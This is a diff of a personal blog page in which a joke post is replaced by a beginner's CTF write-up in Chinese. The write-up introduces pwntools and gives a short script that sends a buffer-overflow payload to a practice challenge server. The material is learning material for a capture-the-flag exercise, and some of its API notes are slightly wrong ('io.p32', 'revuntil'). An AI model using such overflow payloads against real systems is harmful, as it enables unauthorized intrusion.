@@ -20,22 +20,24 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="真不能把我赶走啊，我是良民啊有的人八十岁就死了，三十岁还活着苟利国家生死以，岂因祸福避趋之 %%%%%%%%%%%%%%%%%%炜刚大少爷教我做事，霖涛二少爷教我做人，俊强三少爷教我做梦 呐呐呐呐呐呐呐呐呐呐呐呐呐呐呐呐呐呐 爷青结">
+  <meta name="description" content="诶呀。。。。。。没人告诉我pwntools是用python写的，我看到题解有python语法就先去学python语法，看半天找不到我要的，因为用法在pwntools里。诶呀，恶心啊。。。。 Pwntools主要模块及其使用Tubes模块包含remote和process子模块1234567891011from pwn import *io &#x3D; remote(&quot;127.0.0.1&amp;quot">
 <meta property="og:type" content="article">
-<meta property="og:title" content="班长大人来了，青天就有了">
-<meta property="og:url" content="http://example.com/2020/11/16/%E7%8F%AD%E9%95%BF%E5%A4%A7%E4%BA%BA%E6%9D%A5%E4%BA%86%EF%BC%8C%E9%9D%92%E5%A4%A9%E5%B0%B1%E6%9C%89%E4%BA%86/index.html">
+<meta property="og:title" content="AD_hello_pwn">
+<meta property="og:url" content="http://example.com/2020/12/18/AD-hello-pwn/index.html">
 <meta property="og:site_name" content="全宇宙最蒻的博客">
-<meta property="og:description" content="真不能把我赶走啊，我是良民啊有的人八十岁就死了，三十岁还活着苟利国家生死以，岂因祸福避趋之 %%%%%%%%%%%%%%%%%%炜刚大少爷教我做事，霖涛二少爷教我做人，俊强三少爷教我做梦 呐呐呐呐呐呐呐呐呐呐呐呐呐呐呐呐呐呐 爷青结">
+<meta property="og:description" content="诶呀。。。。。。没人告诉我pwntools是用python写的，我看到题解有python语法就先去学python语法，看半天找不到我要的，因为用法在pwntools里。诶呀，恶心啊。。。。 Pwntools主要模块及其使用Tubes模块包含remote和process子模块1234567891011from pwn import *io &#x3D; remote(&quot;127.0.0.1&amp;quot">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://example.com/2020/11/16/%E7%8F%AD%E9%95%BF%E5%A4%A7%E4%BA%BA%E6%9D%A5%E4%BA%86%EF%BC%8C%E9%9D%92%E5%A4%A9%E5%B0%B1%E6%9C%89%E4%BA%86/QQ%E5%9B%BE%E7%89%8720201116230017.png">
-<meta property="og:image" content="http://example.com/2020/11/16/%E7%8F%AD%E9%95%BF%E5%A4%A7%E4%BA%BA%E6%9D%A5%E4%BA%86%EF%BC%8C%E9%9D%92%E5%A4%A9%E5%B0%B1%E6%9C%89%E4%BA%86/QQ%E5%9B%BE%E7%89%8720201116231454.png">
-<meta property="article:published_time" content="2020-11-16T14:55:11.000Z">
-<meta property="article:modified_time" content="2020-12-11T13:48:53.471Z">
+<meta property="og:image" content="http://example.com/2020/12/18/AD-hello-pwn/1.jpg">
+<meta property="og:image" content="http://example.com/2020/12/18/AD-hello-pwn/3.jpg">
+<meta property="og:image" content="http://example.com/2020/12/18/AD-hello-pwn/2.png">
+<meta property="article:published_time" content="2020-12-18T10:54:01.000Z">
+<meta property="article:modified_time" content="2020-12-18T12:41:10.512Z">
 <meta property="article:author" content="带废物">
+<meta property="article:tag" content="PWN">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2020/11/16/%E7%8F%AD%E9%95%BF%E5%A4%A7%E4%BA%BA%E6%9D%A5%E4%BA%86%EF%BC%8C%E9%9D%92%E5%A4%A9%E5%B0%B1%E6%9C%89%E4%BA%86/QQ%E5%9B%BE%E7%89%8720201116230017.png">
+<meta name="twitter:image" content="http://example.com/2020/12/18/AD-hello-pwn/1.jpg">
 
-<link rel="canonical" href="http://example.com/2020/11/16/%E7%8F%AD%E9%95%BF%E5%A4%A7%E4%BA%BA%E6%9D%A5%E4%BA%86%EF%BC%8C%E9%9D%92%E5%A4%A9%E5%B0%B1%E6%9C%89%E4%BA%86/">
+<link rel="canonical" href="http://example.com/2020/12/18/AD-hello-pwn/">
 
 
 <script id="page-configurations">
@@ -48,7 +50,7 @@
   };
 </script>
 
-  <title>班长大人来了，青天就有了 | 全宇宙最蒻的博客</title>
+  <title>AD_hello_pwn | 全宇宙最蒻的博客</title>
   
 
 
@@ -159,7 +161,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2020/11/16/%E7%8F%AD%E9%95%BF%E5%A4%A7%E4%BA%BA%E6%9D%A5%E4%BA%86%EF%BC%8C%E9%9D%92%E5%A4%A9%E5%B0%B1%E6%9C%89%E4%BA%86/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/18/AD-hello-pwn/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -172,7 +174,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          班长大人来了，青天就有了
+          AD_hello_pwn
         </h1>
 
         <div class="post-meta">
@@ -181,16 +183,10 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
+              
 
-              <time title="Created: 2020-11-16 22:55:11" itemprop="dateCreated datePublished" datetime="2020-11-16T22:55:11+08:00">2020-11-16</time>
+              <time title="Created: 2020-12-18 18:54:01 / Modified: 20:41:10" itemprop="dateCreated datePublished" datetime="2020-12-18T18:54:01+08:00">2020-12-18</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-12-11 21:48:53" itemprop="dateModified" datetime="2020-12-11T21:48:53+08:00">2020-12-11</time>
-              </span>
 
           
 
@@ -203,11 +199,25 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="真不能把我赶走啊，我是良民啊"><a href="#真不能把我赶走啊，我是良民啊" class="headerlink" title="真不能把我赶走啊，我是良民啊"></a><strong><em>真不能把我赶走啊，我是良民啊</em></strong></h1><h6 id="有的人八十岁就死了，三十岁还活着"><a href="#有的人八十岁就死了，三十岁还活着" class="headerlink" title="有的人八十岁就死了，三十岁还活着"></a>有的人八十岁就死了，三十岁还活着</h6><p>苟利国家生死以，岂因祸福避趋之</p>
-<h3 id><a href="#" class="headerlink" title="%%%%%%%%%%%%%%%%%%"></a>%%%%%%%%%%%%%%%%%%</h3><p>炜刚大少爷教我做事，霖涛二少爷教我做人，俊强三少爷教我做梦</p>
-<p>呐呐呐呐呐呐呐呐呐呐呐呐呐呐呐呐呐呐</p>
-<h2 id="爷青结"><a href="#爷青结" class="headerlink" title="爷青结"></a>爷青结</h2><img src="/2020/11/16/%E7%8F%AD%E9%95%BF%E5%A4%A7%E4%BA%BA%E6%9D%A5%E4%BA%86%EF%BC%8C%E9%9D%92%E5%A4%A9%E5%B0%B1%E6%9C%89%E4%BA%86/QQ%E5%9B%BE%E7%89%8720201116230017.png" class>
-<img src="/2020/11/16/%E7%8F%AD%E9%95%BF%E5%A4%A7%E4%BA%BA%E6%9D%A5%E4%BA%86%EF%BC%8C%E9%9D%92%E5%A4%A9%E5%B0%B1%E6%9C%89%E4%BA%86/QQ%E5%9B%BE%E7%89%8720201116231454.png" class>
+        <img src="/2020/12/18/AD-hello-pwn/1.jpg" class>
+<p>诶呀。。。。。。<br>没人告诉我pwntools是用python写的，我看到题解有python语法就先去学python语法，看半天找不到我要的，因为用法在pwntools里。<br>诶呀，恶心啊。。。。</p>
+<h1 id="Pwntools主要模块及其使用"><a href="#Pwntools主要模块及其使用" class="headerlink" title="Pwntools主要模块及其使用"></a>Pwntools主要模块及其使用</h1><h3 id="Tubes模块包含remote和process子模块"><a href="#Tubes模块包含remote和process子模块" class="headerlink" title="Tubes模块包含remote和process子模块"></a>Tubes模块包含remote和process子模块</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">32152</span>)</span><br><span class="line"><span class="comment"># 与互联网主机交互</span></span><br><span class="line">io.sendline(<span class="string">&quot;hello&quot;</span>)</span><br><span class="line">io.send(<span class="string">&quot;hello&quot;</span>)</span><br><span class="line"><span class="comment"># sendline发送数据会在最后多添加一个回车</span></span><br><span class="line">io.recv(<span class="number">1024</span>)</span><br><span class="line">io.revuntil(<span class="string">&quot;hello&quot;</span>)</span><br><span class="line">io.recvline()</span><br><span class="line"><span class="comment"># recv()读取1024个字节，revuntil()读取到指定数据，recvline()会读取一直到回车</span></span><br><span class="line">io.interactive() <span class="comment">#爷不晓得</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">io = process(<span class="string">&quot;./bin&quot;</span>, shell=<span class="literal">True</span>)</span><br><span class="line"><span class="comment">#启动本地程序进行交互，用于gdb调试</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">io.p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">io.p64(<span class="number">0xdeadbeefdeadbeef</span>)</span><br><span class="line">io.u32(<span class="string">&quot;1234&quot;</span>)</span><br><span class="line">io.u64(<span class="string">&quot;12345678&quot;</span>)</span><br><span class="line"><span class="comment"># 将字节数组与数组进行以小端对齐的方式相互转化，32负责转化dword，64负责转化qword</span></span><br></pre></td></tr></table></figure>
+<p>之前昨天速成python是在本机VS2019（我现在还没找到解释器），现在去VMLinux写。</p>
+<p>太懒了，不下IDE了</p>
+<p><strong>新建文件</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; text.py</span><br></pre></td></tr></table></figure>
+<p>右键修改权限后可执行</p>
+<h3 id="开始做题"><a href="#开始做题" class="headerlink" title="开始做题"></a>开始做题</h3><p>本题附件用于反编译，查找漏洞，然后写脚本，用脚本连接对准环境直接攻击（我拿着脚本对附件打了半天）</p>
+<img src="/2020/12/18/AD-hello-pwn/3.jpg" class>
+<p>把附件先扔到IDA反编译</p>
+<img src="/2020/12/18/AD-hello-pwn/2.png" class>
+<p>你要是不晓得这是啥玩意，巧了，我也不知道</p>
+<p>写脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  <span class="comment">#导入pwntools的工具，我一开始在导入附件，别骂了</span></span><br><span class="line">io=remote(<span class="string">&#x27;220.249.52.134&#x27;</span>,<span class="number">41392</span>) <span class="comment">#连接环境</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>+p64(<span class="number">1853186401</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;bof&quot;</span>) <span class="comment">#读取到指定数据</span></span><br><span class="line">io.sendline(payload) <span class="comment">#发送数据</span></span><br><span class="line">io.interactive() <span class="comment">#爷不懂得</span></span><br></pre></td></tr></table></figure>
+<p>运行脚本，成功</p>
+<p>爷太菜了，爷滚去看汇编了</p>
 
     </div>
 
@@ -216,6 +226,9 @@
     
 
       <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/PWN/" rel="tag"># PWN</a>
+          </div>
 
         
 
@@ -223,13 +236,10 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2020/11/03/%E9%82%BB%E6%8E%A5%E8%A1%A8%E5%8F%8A%E5%85%B6cpp%E4%BB%A3%E7%A0%81/" rel="prev" title="邻接表及其cpp代码">
-      <i class="fa fa-chevron-left"></i> 邻接表及其cpp代码
+    <a href="/2020/12/17/python/" rel="prev" title="python">
+      <i class="fa fa-chevron-left"></i> python
     </a></div>
-      <div class="post-nav-item">
-    <a href="/2020/11/17/HTML%E8%AF%AD%E6%B3%95/" rel="next" title="HTML语法">
-      HTML语法 <i class="fa fa-chevron-right"></i>
-    </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -288,7 +298,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%9C%9F%E4%B8%8D%E8%83%BD%E6%8A%8A%E6%88%91%E8%B5%B6%E8%B5%B0%E5%95%8A%EF%BC%8C%E6%88%91%E6%98%AF%E8%89%AF%E6%B0%91%E5%95%8A"><span class="nav-number">1.</span> <span class="nav-text">真不能把我赶走啊，我是良民啊</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%9C%89%E7%9A%84%E4%BA%BA%E5%85%AB%E5%8D%81%E5%B2%81%E5%B0%B1%E6%AD%BB%E4%BA%86%EF%BC%8C%E4%B8%89%E5%8D%81%E5%B2%81%E8%BF%98%E6%B4%BB%E7%9D%80"><span class="nav-number">1.0.0.0.0.1.</span> <span class="nav-text">有的人八十岁就死了，三十岁还活着</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">1.0.1.</span> <span class="nav-text">%%%%%%%%%%%%%%%%%%</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%88%B7%E9%9D%92%E7%BB%93"><span class="nav-number">1.1.</span> <span class="nav-text">爷青结</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Pwntools%E4%B8%BB%E8%A6%81%E6%A8%A1%E5%9D%97%E5%8F%8A%E5%85%B6%E4%BD%BF%E7%94%A8"><span class="nav-number">1.</span> <span class="nav-text">Pwntools主要模块及其使用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Tubes%E6%A8%A1%E5%9D%97%E5%8C%85%E5%90%ABremote%E5%92%8Cprocess%E5%AD%90%E6%A8%A1%E5%9D%97"><span class="nav-number">1.0.1.</span> <span class="nav-text">Tubes模块包含remote和process子模块</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%80%E5%A7%8B%E5%81%9A%E9%A2%98"><span class="nav-number">1.0.2.</span> <span class="nav-text">开始做题</span></a></li></ol></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
